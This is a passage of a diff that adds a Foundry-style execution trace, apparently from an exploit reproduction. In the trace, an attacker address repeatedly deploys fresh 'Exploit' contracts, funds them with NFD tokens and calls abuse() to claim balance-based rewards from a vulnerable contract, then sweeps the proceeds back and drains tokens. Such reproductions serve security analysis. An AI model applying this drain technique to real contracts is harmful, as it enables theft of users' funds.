+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 28822734252031315213942147 [2.882e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B], 2398051489769005425799986 [2.398e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B], value: 2398051489769005425799900 [2.398e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 31220785741800320639742133 [3.122e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 31220785741800320639742133 [3.122e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 31220785741800320639742100 [3.122e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 31220785741800320639742133 [3.122e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], 31220785741800320639742133 [3.122e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], value: 31220785741800320639742100 [3.122e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 31220785741800320639742132 [3.122e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], 2597569373717786677226545 [2.597e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], value: 2597569373717786677226500 [2.597e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 33818355115518107316968677 [3.381e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33818355115518107316968677 [3.381e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 33818355115518107316968600 [3.381e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xe8dc788818033232EF9772CB2e6622F1Ec8bc840
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 33818355115518107316968677 [3.381e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], 33818355115518107316968677 [3.381e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], value: 33818355115518107316968600 [3.381e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 33818355115518107316968676 [3.381e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], 2813687145611106528771793 [2.813e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], value: 2813687145611106528771700 [2.813e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 36632042261129213845740469 [3.663e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 36632042261129213845740469 [3.663e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 36632042261129213845740400 [3.663e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 36632042261129213845740469 [3.663e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], 36632042261129213845740469 [3.663e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], value: 36632042261129213845740400 [3.663e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 36632042261129213845740468 [3.663e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], 3047785916125950591965606 [3.047e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], value: 3047785916125950591965600 [3.047e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 39679828177255164437706074 [3.967e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 39679828177255164437706074 [3.967e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 39679828177255164437706000 [3.967e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 39679828177255164437706074 [3.967e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], 39679828177255164437706074 [3.967e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], value: 39679828177255164437706000 [3.967e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 39679828177255164437706073 [3.967e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], 3301361704347629681217145 [3.301e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], value: 3301361704347629681217100 [3.301e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 42981189881602794118923218 [4.298e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 42981189881602794118923218 [4.298e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 42981189881602794118923200 [4.298e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x796f2974e3C1af763252512dd6d521E9E984726C
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 42981189881602794118923218 [4.298e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C], 42981189881602794118923218 [4.298e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C], value: 42981189881602794118923200 [4.298e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 42981189881602794118923217 [4.298e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C], 3576034998149352470694411 [3.576e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C], value: 3576034998149352470694400 [3.576e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 46557224879752146589617628 [4.655e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 46557224879752146589617628 [4.655e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 46557224879752146589617600 [4.655e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x92a6649Fdcc044DA968d94202465578a9371C7b1
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 46557224879752146589617628 [4.655e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], 46557224879752146589617628 [4.655e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], value: 46557224879752146589617600 [4.655e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 46557224879752146589617627 [4.655e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], 3873561109995378596256186 [3.873e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], value: 3873561109995378596256100 [3.873e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 50430785989747525185873813 [5.043e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50430785989747525185873813 [5.043e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 50430785989747525185873800 [5.043e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 50430785989747525185873813 [5.043e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], 50430785989747525185873813 [5.043e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], value: 50430785989747525185873800 [5.043e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 50430785989747525185873812 [5.043e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], 4195841394346994095464701 [4.195e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], value: 4195841394346994095464700 [4.195e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 54626627384094519281338513 [5.462e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 54626627384094519281338513 [5.462e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 54626627384094519281338500 [5.462e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x886D6d1eB8D415b00052828CD6d5B321f072073d
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 54626627384094519281338513 [5.462e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], 54626627384094519281338513 [5.462e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], value: 54626627384094519281338500 [5.462e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 54626627384094519281338512 [5.462e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], 4544935398356664004207364 [4.544e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], value: 4544935398356664004207300 [4.544e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 59171562782451183285545876 [5.917e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 59171562782451183285545876 [5.917e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 59171562782451183285545800 [5.917e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x3C4293F66941ECa00f4950C10d4255d5c271bAeF
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 59171562782451183285545876 [5.917e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], 59171562782451183285545876 [5.917e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], value: 59171562782451183285545800 [5.917e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 59171562782451183285545875 [5.917e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], 4923074023499938449357416 [4.923e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], value: 4923074023499938449357400 [4.923e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 64094636805951121734903291 [6.409e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 64094636805951121734903291 [6.409e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x3C4293F66941ECa00f4950C10d4255d5c271bAeF], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 64094636805951121734903200 [6.409e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 64094636805951121734903291 [6.409e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], 64094636805951121734903291 [6.409e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], value: 64094636805951121734903200 [6.409e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 64094636805951121734903290 [6.409e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], 5332673782255133328343953 [5.332e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], value: 5332673782255133328343900 [5.332e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 69427310588206255063247243 [6.942e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 69427310588206255063247243 [6.942e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x89CA9F4f77B267778EB2eA0Ba1bEAdEe8523af36], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 69427310588206255063247200 [6.942e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0xe54a55121A47451c5727ADBAF9b9FC1643477e25
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 69427310588206255063247243 [6.942e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], 69427310588206255063247243 [6.942e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], value: 69427310588206255063247200 [6.942e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 69427310588206255063247242 [6.942e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], 5776352240938760421262170 [5.776e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: vulnContractName: [0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E], to: Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], value: 5776352240938760421262100 [5.776e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 75203662829145015484509412 [7.52e25]
+    │   │   │   │   ├─ [10844] NFD::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 75203662829145015484509412 [7.52e25])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0xe54a55121A47451c5727ADBAF9b9FC1643477e25], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 75203662829145015484509400 [7.52e25])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [836088] → new Exploit@0x94771550282853f6E0124c302F7dE1Cf50aa45CA
+    │   │   │   │   └─ ← [Return] 3955 bytes of code
+    │   │   │   ├─ [2855] NFD::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 75203662829145015484509412 [7.52e25]
+    │   │   │   ├─ [79852] NFD::transfer(Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], 75203662829145015484509412 [7.52e25])
+    │   │   │   │   ├─ emit Transfer(from: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], value: 75203662829145015484509400 [7.52e25])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [54308] Exploit::abuse()
+    │   │   │   │   ├─ [39161] vulnContractName::6811e3b9(00000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [2855] NFD::balanceOf(Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 75203662829145015484509411 [7.52e25]
+    │   │   │   │   │   ├─ [10844] NFD::transfer(Exploit: [0x94771550282853f6E0124c302F7dE1Cf50aa45CA], 6256944747384865288311182 [6.256e24])
